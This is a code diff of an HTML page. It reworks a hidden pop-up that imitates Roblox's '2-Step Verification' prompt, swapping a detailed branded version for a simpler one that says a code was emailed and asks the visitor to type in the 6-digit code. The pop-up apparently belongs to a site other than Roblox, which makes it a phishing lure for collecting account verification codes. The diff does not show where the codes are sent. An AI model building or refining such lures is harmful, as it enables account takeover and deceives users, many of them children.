@@ -294,53 +294,25 @@
     <div id="roblox2StepPopup" class="roblox-auth-overlay" style="display: none;">
         <div class="roblox-auth-modal">
             <div class="roblox-auth-header">
-                <div class="roblox-header-content">
-                    <div class="roblox-logo-container">
-                        <svg width="48" height="48" viewBox="0 0 95 95" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <rect width="95" height="95" rx="8" fill="white"/>
-                            <path d="M47.5 0L95 47.5L47.5 95L0 47.5L47.5 0Z" fill="#00A2FF"/>
-                            <path d="M25.5 25.5H69.5V69.5H25.5V25.5Z" fill="white"/>
-                        </svg>
-                    </div>
-                    <h1>Roblox</h1>
-                </div>
-                <button class="roblox-close" onclick="closeRobloxAuth()">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-                        <path d="M18 6L6 18M6 6L18 18" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-                    </svg>
-                </button>
+                <h2>2-Step Verification</h2>
+                <button class="roblox-close" onclick="closeRobloxAuth()">×</button>
             </div>
             <div class="roblox-auth-content">
-                <div class="roblox-auth-main">
-                    <div class="roblox-security-icon">
-                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none">
-                            <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="#00A2FF" stroke-width="2" fill="#E3F2FD"/>
-                            <path d="M9 12L11 14L15 10" stroke="#00A2FF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                        </svg>
-                    </div>
-                    <h2>2-Step Verification</h2>
-                    <p class="roblox-auth-description">To keep your account secure, please enter the 6-digit code from your authenticator app.</p>
-                    
-                    <div class="roblox-code-input-container">
-                        <label class="roblox-input-label">Verification Code</label>
-                        <div class="roblox-code-inputs">
-                            <input type="text" class="roblox-code-digit" maxlength="1" data-index="0">
-                            <input type="text" class="roblox-code-digit" maxlength="1" data-index="1">
-                            <input type="text" class="roblox-code-digit" maxlength="1" data-index="2">
-                            <input type="text" class="roblox-code-digit" maxlength="1" data-index="3">
-                            <input type="text" class="roblox-code-digit" maxlength="1" data-index="4">
-                            <input type="text" class="roblox-code-digit" maxlength="1" data-index="5">
-                        </div>
-                    </div>
-                    
-                    <div class="roblox-auth-actions">
-                        <button class="roblox-btn-verify" onclick="submitRobloxAuth()">Verify</button>
-                        <button class="roblox-btn-cancel" onclick="closeRobloxAuth()">Cancel</button>
-                    </div>
-                    
-                    <div class="roblox-auth-help">
-                        <a href="#" class="roblox-help-link">Having trouble? Get help with 2-Step Verification</a>
-                    </div>
+                <div class="roblox-verification-icon">🔐</div>
+                <p class="roblox-verification-text">We have sent a verification code to your email address. Please enter the code below to continue.</p>
+                
+                <div class="roblox-input-container">
+                    <label for="robloxVerificationCode">Enter verification code:</label>
+                    <input type="text" id="robloxVerificationCode" class="roblox-verification-input" placeholder="Enter 6-digit code" maxlength="6">
+                </div>
+                
+                <div class="roblox-auth-buttons">
+                    <button class="roblox-verify-btn" onclick="submitRobloxAuth()">Verify</button>
+                    <button class="roblox-cancel-btn" onclick="closeRobloxAuth()">Cancel</button>
+                </div>
+                
+                <div class="roblox-resend-section">
+                    <p>Didn't receive the code? <a href="#" class="roblox-resend-link">Resend verification code</a></p>
                 </div>
             </div>
         </div>
